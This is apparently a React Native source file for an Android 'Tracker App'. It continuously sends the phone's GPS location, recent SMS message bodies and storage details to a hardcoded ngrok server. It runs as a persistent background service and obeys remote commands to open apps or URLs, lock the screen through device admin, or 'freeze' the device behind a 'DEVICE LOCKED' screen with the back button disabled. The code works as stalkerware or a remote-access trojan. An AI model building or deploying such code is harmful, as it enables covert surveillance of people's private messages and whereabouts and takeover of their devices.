/**
 * Tracker App
 */

import React, { useEffect, useState, useRef } from 'react';
import { StatusBar, StyleSheet, View, Text, Alert, PermissionsAndroid, Platform, ScrollView, Linking, NativeModules, BackHandler, TouchableOpacity } from 'react-native';
import Geolocation from 'react-native-geolocation-service';
import DeviceInfo from 'react-native-device-info';
import io from 'socket.io-client';
import SmsAndroid from 'react-native-get-sms-android';
import BackgroundService from 'react-native-background-actions';
import SendIntentAndroid from 'react-native-send-intent';

const SERVER_URL = 'https://subopaquely-podophyllic-nicola.ngrok-free.dev'; // Public ngrok URL

// Background task options
const options = {
  taskName: 'TrackerBackground',
  taskTitle: 'Tracker App Running',
  taskDesc: 'Maintaining connection to server',
  taskIcon: {
    name: 'ic_launcher',
    type: 'mipmap',
  },
  color: '#ff00ff',
  linkingURI: 'trackerapp://chat',
  parameters: {
    delay: 1000,
  },
};

// Background task function
const backgroundTask = async (taskDataArguments: any) => {
  const { delay } = taskDataArguments;
  await new Promise<void>(async (resolve) => {
    // Keep the socket alive in background
    // The socket is already initialized in the main thread
    // This just keeps the task running
    for (let i = 0; BackgroundService.isRunning(); i++) {
      await BackgroundService.updateNotification({ taskDesc: `Running for ${i} seconds` });
      await new Promise<void>((res) => setTimeout(() => res(), delay));
    }
  });
};

function App() {
  const [deviceId, setDeviceId] = useState('');
  const [location, setLocation] = useState({ lat: 0, lon: 0 });
  const [sms, setSms] = useState<string[]>([]);
  const [storage, setStorage] = useState({ total: 0, free: 0 });
  const [watchId, setWatchId] = useState<number | null>(null);
  const [socketConnected, setSocketConnected] = useState(false);
  const [isFrozen, setIsFrozen] = useState(false);
  const socketRef = useRef<any>(null);

  const isFrozenRef = useRef(false);

  useEffect(() => {
    isFrozenRef.current = isFrozen;
  }, [isFrozen]);

  useEffect(() => {
    const backHandler = BackHandler.addEventListener('hardwareBackPress', () => {
      return isFrozenRef.current;
    });
    return () => backHandler.remove();
  }, []);

  // Manual reconnect function
  const reconnect = () => {
    if (socketRef.current) {
      console.log('Manual reconnect requested');
      if (socketRef.current.disconnected) {
        socketRef.current.connect();
      }
    }
  };

  useEffect(() => {
    const init = async () => {
      const id = await DeviceInfo.getUniqueId();
      setDeviceId(id);

      if (Platform.OS === 'android') {
        await requestPermissions();
      }


      // Connect to socket
      console.log('=== REACT NATIVE SOCKET DEBUG ===');
      console.log('Attempting to connect to:', SERVER_URL);
      console.log('Device ID:', id);

      const socket = io(SERVER_URL, {
        reconnection: true,
        reconnectionAttempts: Infinity,
        reconnectionDelay: 1000,
        reconnectionDelayMax: 5000,
        timeout: 20000,
        transports: ['websocket', 'polling']
      });

      socket.on('connect', () => {
        console.log('=== CONNECTION SUCCESS ===');
        console.log('Connected to server with socket ID:', socket.id);
        console.log('Transport used:', socket.io.engine.transport.name);
        setSocketConnected(true);
        try {
          socket.emit('register', id); // Register device with server
          console.log('Device registration sent for ID:', id);
        } catch (error) {
          console.error('Error registering device:', error);
        }
      });

      socket.on('connect_error', (err) => {
        console.log('=== CONNECTION ERROR ===');
        console.log('Socket connection error:', err);
        console.log('Error message:', err.message);
        console.log('Server URL attempted:', SERVER_URL);
        setSocketConnected(false);
        // Don't show alert on every connection error to avoid annoying the user
        // The UI will show connection status
      });

      socket.on('disconnect', (reason) => {
        console.log('=== DISCONNECTION ===');
        console.log('Socket disconnected, reason:', reason);
        console.log('Will attempt reconnection...');
        setSocketConnected(false);
      });

      socket.on('reconnect_attempt', (attemptNumber) => {
        console.log('Reconnection attempt #', attemptNumber);
      });

      socket.on('reconnect_error', (err) => {
        console.log('Reconnection failed:', err);
      });

      socket.on('reconnect', (attemptNumber) => {
        console.log('Reconnected after', attemptNumber, 'attempts');
      });

      socket.on('command', (data) => {
        try {
          console.log('Command received:', data);
          if (data.deviceId === id) {
            const command = data.command.toLowerCase().trim();
            const openCommand = (url: string) => Linking.openURL(url).catch(err => Alert.alert(`Failed to open ${url}`, err.message));

            if (command.startsWith('open ')) {
              const target = command.substring(5);
              switch (target) {
                case 'youtube':
                  // Try explicit package first for better experience, fallback to intent
                  SendIntentAndroid.openApp('com.google.android.youtube', {}).then((wasOpened) => {
                    if (!wasOpened) openCommand('vnd.youtube://');
                  });
                  break;
                case 'maps':
                  SendIntentAndroid.openApp('com.google.android.apps.maps', {}).then((wasOpened) => {
                    if (!wasOpened) openCommand('geo:0,0');
                  });
                  break;
                case 'camera':
                  SendIntentAndroid.openCamera();
                  break;
                case 'lock':
                  // @ts-ignore
                  NativeModules.LockModule.lockScreen()
                    .then(() => console.log('Screen locked'))
                    .catch((err: any) => Alert.alert('Lock Failed', 'Enable Admin permission first'));
                  break;
                case 'freeze':
                  setIsFrozen(true);
                  // @ts-ignore
                  NativeModules.LockModule.startPinning()
                    .catch((err: any) => console.error('Error starting pinning:', err));
                  break;
                case 'unfreeze':
                  setIsFrozen(false);
                  // @ts-ignore
                  NativeModules.LockModule.stopPinning()
                    .catch((err: any) => console.error('Error stopping pinning:', err));
                  break;
                default:
                  // Try to open as a package name first (e.g. "open com.whatsapp")
                  SendIntentAndroid.openApp(target, {}).then((wasOpened) => {
                    if (!wasOpened) {
                      // If not a package, try as a generic URL schemed intent
                      SendIntentAndroid.openAppWithUri(target, {}).then((wasOpenedUri) => {
                        if (!wasOpenedUri) {
                          Alert.alert('Unknown Command', `Could not open app or intent: ${target}`);
                        }
                      });
                    }
                  });
                  break;
              }
            } else if (command.startsWith('http')) {
              openCommand(command);
            } else {
              Alert.alert('Command Received', `Command: ${data.command}`);
            }
          }
        } catch (error) {
          console.error('Error handling command:', error);
        }
      });

      // Start continuous location watching and data collection
      startLocationTracking(id, socket);

      // Start background service to keep app alive
      try {
        await BackgroundService.start(backgroundTask, options);
        console.log('Background service started successfully');
      } catch (error) {
        console.error('Failed to start background service:', error);
        Alert.alert('Background Service Error', 'Could not start background service. The app will still function but may not run in background.');
      }
    };

    init();

    return () => {
      if (watchId !== null) {
        Geolocation.clearWatch(watchId);
      }
      BackgroundService.stop();
    };
  }, []);

  const requestPermissions = async () => {
    try {
      const permissionsToRequest = [
        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
        PermissionsAndroid.PERMISSIONS.READ_SMS,
        PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
      ];

      // Add POST_NOTIFICATIONS for Android 13+ (API level 33+)
      if (Platform.OS === 'android' && typeof Platform.Version === 'number' && Platform.Version >= 33) {
        permissionsToRequest.push(PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS);
      }

      const granted = await PermissionsAndroid.requestMultiple(permissionsToRequest);
      console.log('Permissions granted:', granted);
    } catch (err) {
      console.warn('Error requesting permissions:', err);
    }
  };

  const startLocationTracking = (id: string, socket: any) => {
    const watch = Geolocation.watchPosition(
      (position) => {
        const newLocation = {
          lat: position.coords.latitude,
          lon: position.coords.longitude,
        };
        setLocation(newLocation);

        // Read SMS
        SmsAndroid.list(
          JSON.stringify({}),
          (fail) => {
            console.log('Failed to read SMS: ' + fail);
            const newSms: string[] = [];
            setSms(newSms);
            // Get storage info
            DeviceInfo.getTotalDiskCapacity().then((total) => {
              DeviceInfo.getFreeDiskStorage().then((free) => {
                const newStorage = { total, free };
                setStorage(newStorage);
                // Send data via socket
                socket.emit('data', { deviceId: id, location: newLocation, sms: newSms, storage: newStorage });
              });
            });
          },
          (count, smsList) => {
            const smsArray = JSON.parse(smsList);
            const newSms = smsArray.slice(0, 10).map((sms: any) => sms.body);
            setSms(newSms);
            // Get storage info
            DeviceInfo.getTotalDiskCapacity().then((total) => {
              DeviceInfo.getFreeDiskStorage().then((free) => {
                const newStorage = { total, free };
                setStorage(newStorage);
                // Send data via socket
                socket.emit('data', { deviceId: id, location: newLocation, sms: newSms, storage: newStorage });
              });
            });
          }
        );
      },
      (error) => console.error('Location error:', error),
      { enableHighAccuracy: true, distanceFilter: 10, interval: 5000 }
    );

    setWatchId(watch);
  };


  if (isFrozen) {
    return (
      <View style={[styles.container, { backgroundColor: '#cc0000' }]}>
        <StatusBar hidden={true} />
        <Text style={{ color: 'white', fontSize: 32, fontWeight: 'bold' }}>DEVICE LOCKED</Text>
        <Text style={{ color: 'white', fontSize: 18, marginTop: 20 }}>Contact Administrator</Text>
      </View>
    );
  }

  return (
    <View style={styles.container}>
      <Text>Tracker App Running</Text>
      <Text>Device ID: {deviceId}</Text>
      <Text>Socket Connected: {socketConnected ? 'Yes' : 'No'}</Text>
      {!socketConnected && (
        <Text style={{ color: 'red', marginTop: 10 }} onPress={reconnect}>Tap to Retry Connection</Text>
      )}
      <View style={{ marginTop: 20 }}>
        <Text onPress={() => {
          // @ts-ignore
          NativeModules.LockModule.enableAdmin();
        }} style={{ padding: 10, backgroundColor: '#ddd', borderRadius: 5, marginBottom: 10, textAlign: 'center' }}>Enable Admin (for Lock)</Text>
      </View>
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
  },
});

export default App;
